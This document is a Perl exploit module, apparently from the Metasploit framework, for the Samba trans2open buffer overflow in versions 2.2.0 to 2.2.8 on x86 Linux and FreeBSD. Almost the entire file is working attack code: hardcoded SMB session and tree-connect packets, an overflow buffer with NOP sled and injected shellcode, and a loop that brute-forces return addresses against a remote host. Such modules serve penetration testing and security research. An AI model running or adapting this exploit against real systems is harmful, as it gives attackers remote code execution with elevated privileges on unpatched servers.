package Msf::Exploit::samba_trans2open;
use base "Msf::Exploit";
use strict;

my %info =
(
    'Name'  => 'Samba trans2open Overflow',
    'Version'  => '2.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'linux', 'bsd' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The samba port', 139],
                   },
                
    'Payload' => {
                    'Size'      => 934,
                    'BadChars'  => "\x00",
                 },
    
    'Description'  =>  "This exploits the buffer overflow found in Samba versions ".
                       "2.2.0 to 2.2.8. This particular module is capable of exploiting ".
                       "the bug on x86 Linux and FreeBSD systems.",
                
    'Refs'  =>  [  
                    'http://www.digitaldefense.net/labs/advisories/DDI-1013.txt'
                ],
    'Targets' => [ 
                    ["Linux x86",   0xbfffffdc, 0xbfa00000, 512 ],
                    ["FreeBSD x86", 0xbfbffffc, 0xbf100000, 512 ],
                   #["Solaris x86", 0x08047ffc, 0x08010101, 512],   
                ],
    
);


sub new {
    my $class = shift;
    my $obj = $class->SUPER::new({'Info' => \%info}, @_);
    return $obj;
}

sub Exploit {
    my ($obj, $opt) = @_;

    select(STDOUT);$|++;

    my $target_host = $opt->{"RHOST"};
    my $target_port = $opt->{"RPORT"};
    my $target = defined($obj->{'Info'}->{'Targets'}->[$opt->{'TARGET'}]) ? 
                 $obj->{'Info'}->{'Targets'}->[$opt->{'TARGET'}] : 
                 $obj->{'Info'}->{'Targets'}->[0];
                 
    my $shellcode = $opt->{'SHELLCODE'};

    my $curr_ret;
    print "[*] Starting brute force mode...\n";
    for ( 
          $curr_ret  = $target->[1]; 
          $curr_ret >= $target->[2];
          $curr_ret -= $target->[3]
        )
    {
        my $Ret = pack("l", $curr_ret);
        my $Wri = pack("l", ($curr_ret - 512));

        my $s = Pex::Socket->new();

        if (! $s->tcp($target_host, $target_port, $opt->{'CPORT'}))
        {
            print "\n[*] Error: ". $s->get_error() . "\n";
            exit(0);
        }

        my $SetupSession = 
        "\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00".
        "\x00\x00";

        my $TreeConnect =
        "\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00".
        "\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e".
        "\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";

        my $Flush = ("\x00" x 810);

        $s->send($SetupSession);
        my $res = $s->recv(5);

        $s->send($TreeConnect);
        $res = $s->recv(5);

        my $Overflow =
        "\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
        "\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90";

        $Overflow .=  $shellcode; # 936 bytes 
        $Overflow .=  "\x90" x 97;
        $Overflow .= (($Wri . $Ret) x 4) . ("\x00" x 273);


        printf ("[*] Trying return address 0x%.8x\n", $curr_ret, length($Overflow));
        $s->send($Overflow);
        $s->send($Flush);

        # This enables this exploit to be used with findsock payloads
        if (defined($opt->{'HANDLER'}) && defined($opt->{'HCFUNC'}))
        {
            my $handler = $opt->{'HANDLER'};
            my $hfunc   = $opt->{'HCFUNC'};
            $handler->$hfunc($opt, $s);
        }
        
        $s->close();
        undef($s);
    }
    exit(0);
}


1;
